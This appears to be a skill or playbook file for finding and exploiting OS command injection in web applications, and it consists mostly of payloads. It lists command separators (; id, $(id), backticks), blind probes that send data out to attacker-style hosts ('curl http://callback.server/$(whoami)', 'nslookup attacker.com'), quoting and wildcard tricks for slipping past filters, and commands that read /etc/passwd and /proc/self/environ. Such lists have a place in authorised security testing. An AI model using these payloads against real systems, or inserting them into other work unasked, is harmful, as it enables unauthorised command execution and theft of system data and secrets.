---
name: command-injection
category: injection
description: OS command injection detection and exploitation
attack_types:
  - command_injection
  - injection
severity_range: [high, critical]
---

# OS Command Injection

## Phase 1: Identify Injection Points
- Parameters that interact with OS: filename, path, IP address, hostname, ping, traceroute
- File operations: upload, download, convert, compress
- System info endpoints: status, health, diagnostics
- Email functions: mail headers, SMTP relay

## Phase 2: Basic Injection Tests
```
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
%0d id
;{id}
```

## Phase 3: Blind Detection
- Time-based: `; sleep 5`, `| timeout /t 5` (Windows)
- DNS-based: `; nslookup attacker.com`, `$(nslookup attacker.com)`
- File-based: `; echo test > /tmp/cmdtest`
- Out-of-band: `; curl http://callback.server/$(whoami)`

## Phase 4: Filter Bypasses
- Whitespace bypass: `${IFS}`, `$IFS$9`, `{cmd,arg}`, `%09` (tab)
- Blacklist bypass: `w'h'o'a'm'i`, `w"h"o"a"m"i`, `\w\h\o\a\m\i`
- Wildcard bypass: `/???/??t /???/p??s??` = `cat /etc/passwd`
- Encoding: `$(printf '\x69\x64')` = id
- Variable injection: `$PATH`, `${HOME}`

## Phase 5: Platform-Specific
- Linux: `/etc/passwd`, `id`, `uname -a`, `/proc/self/environ`
- Windows: `type C:\windows\win.ini`, `whoami`, `ipconfig`, `systeminfo`
- Chained commands: `command1;command2`, `command1&&command2`
